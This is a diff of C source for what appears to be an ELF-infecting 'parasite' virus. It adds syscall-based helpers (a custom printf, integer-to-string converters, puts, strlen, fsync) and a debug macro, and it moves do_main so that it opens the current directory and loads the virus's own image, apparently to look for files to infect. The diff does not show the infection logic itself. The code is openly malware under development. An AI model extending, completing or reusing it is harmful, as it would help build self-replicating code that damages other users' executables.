@@ -20,6 +20,11 @@
 /* libc */
 void _memcpy(void *dst, void *src, unsigned int len);
 int _memcmp(const void *s1, const void *s2, unsigned int n);
+int _printf(char *fmt, ...);
+char * itoa(long x, char *t);
+char * itox(long x, char *t);
+int _puts(char *str);
+size_t _strlen(char *s);
 
 /* syscalls */
 void Exit(long);
@@ -28,6 +33,7 @@ long _write(long fd, char *buf, unsigned long len);
 int _fstat(long fd, void *buf);
 int _close(unsigned int fd);
 long _open(const char *path, unsigned long flags, long mode);
+int _fsync(int fd);
 void *_mmap(void *addr, unsigned long len, unsigned long prot, unsigned long flags, long fd, unsigned long off);
 int _munmap(void *addr, size_t len);
 
@@ -37,6 +43,13 @@ void end_code(void);
 void dummy_marker(void);
 
 #define PIC_RESOLVE_ADDR(target) (get_rip() - ((char*)&get_rip_label - (char*)target))
+
+#if defined(DEBUG) && DEBUG > 0
+	#define DEBUG_PRINT(fmt, args...) _printf("DEBUG: %s:%d:%s(): " fmt, \
+		__FILE__, __LINE__, __func__, ##args)
+#else
+	#define DEBUG_PRINT(fmt, args...) /* Do not do nothing */
+#endif
 
 #define __ASM__ __asm__ __volatile__
 
@@ -113,21 +126,6 @@ int _start() {
 	 	"pop %rsp			\n"	
 	 	"add $0x8, %rsp		\n"
 	 	"jmp end_code		"); 
-}
-
-void do_main() {
-	/* Declare variables */
-	char cwd[2];	
-	ssize_t cwd_fd;
-	
-	/* Code */
-	cwd[0] = '.';
-	cwd[1] = '\0';
-
-	cwd_fd = _open(cwd, O_RDONLY | O_DIRECTORY, 0);
-	if (cwd_fd < 0) {
-		return;
-	}
 }
 
 /* Since our parasite exists of both a text and data segment
@@ -247,6 +245,26 @@ int check_criteria(char *filename) {
 	return 0;
 }
 
+void do_main() {
+	/* Declare variables */
+	char cwd[2];	
+	ssize_t cwd_fd;
+
+	elfbin_t self;
+	
+	/* Code */
+	cwd[0] = '.';
+	cwd[1] = '\0';
+
+	cwd_fd = _open(cwd, O_RDONLY | O_DIRECTORY, 0);
+	if (cwd_fd < 0) {
+		return;
+	}
+
+	load_self(&self);
+
+}
+
 void Exit(long status) {
 	__asm__ volatile(
 		"mov %0, %%rdi		\n"
@@ -310,6 +328,18 @@ long _open(const char *path, unsigned long flags, long mode) {
         return ret;
 }
 
+int _fsync(int fd) {
+        long ret;
+        __asm__ volatile(
+                        "mov %0, %%rdi\n"
+                        "mov $74, %%rax\n"
+                        "syscall" : : "g"(fd));
+
+        asm ("mov %%rax, %0" : "=r"(ret));
+        return (int)ret;
+}
+
+
 void *_mmap(void *addr, unsigned long len, unsigned long prot, unsigned long flags, long fd, unsigned long off) {
         long mmap_fd = fd;
         unsigned long mmap_off = off;
@@ -363,6 +393,119 @@ int _memcmp(const void *s1, const void *s2, unsigned int n) {
     }
 }
 
+int _printf(char *fmt, ...) {
+        int in_p;
+        unsigned long dword;
+        unsigned int word;
+        char numbuf[26] = {0};
+        __builtin_va_list alist;
+
+        in_p;
+        __builtin_va_start((alist), (fmt));
+
+        in_p = 0;
+        while(*fmt) {
+                if (*fmt!='%' && !in_p) {
+                        _write(1, fmt, 1);
+                        in_p = 0;
+                }
+                else if (*fmt!='%') {
+                        switch(*fmt) {
+                                case 's':
+                                        dword = (unsigned long) __builtin_va_arg(alist, long);
+                                        _puts((char *)dword);
+                                        break;
+                                case 'u':
+                                        word = (unsigned int) __builtin_va_arg(alist, int);
+                                        _puts(itoa(word, numbuf));
+                                        break;
+                                case 'd':
+                                        word = (unsigned int) __builtin_va_arg(alist, int);
+                                        _puts(itoa(word, numbuf));
+                                        break;
+                                case 'x':
+                                        dword = (unsigned long) __builtin_va_arg(alist, long);
+                                        _puts(itox(dword, numbuf));
+                                        break;
+                                default:
+                                        _write(1, fmt, 1);
+                                        break;
+                        }
+                        in_p = 0;
+                }
+                else {
+                        in_p = 1;
+                }
+                fmt++;
+        }
+        return 1;
+}
+
+char * itoa(long x, char *t) {
+        int i;
+        int j;
+
+        i = 0;
+        do
+        {
+                t[i] = (x % 10) + '0';
+                x /= 10;
+                i++;
+        } while (x!=0);
+
+        t[i] = 0;
+
+        for (j=0; j < i / 2; j++) {
+                t[j] ^= t[i - j - 1];
+                t[i - j - 1] ^= t[j];
+                t[j] ^= t[i - j - 1];
+        }
+
+        return t;
+}
+char * itox(long x, char *t) {
+        int i;
+        int j;
+
+        i = 0;
+        do
+        {
+                t[i] = (x % 16);
+
+                /* char conversion */
+                if (t[i] > 9)
+                        t[i] = (t[i] - 10) + 'a';
+                else
+                        t[i] += '0';
+
+                x /= 16;
+                i++;
+        } while (x != 0);
+
+        t[i] = 0;
+
+        for (j=0; j < i / 2; j++) {
+                t[j] ^= t[i - j - 1];
+                t[i - j - 1] ^= t[j];
+                t[j] ^= t[i - j - 1];
+        }
+
+        return t;
+}
+
+int _puts(char *str) {
+        _write(1, str, _strlen(str));
+        _fsync(1);
+
+        return 1;
+}
+
+size_t _strlen(char *s) {
+        size_t sz;
+
+        for (sz=0;s[sz];sz++);
+        return sz;
+}
 /* -------------------- Custom ----------------------------------- */
 
 unsigned long get_rip(void) {
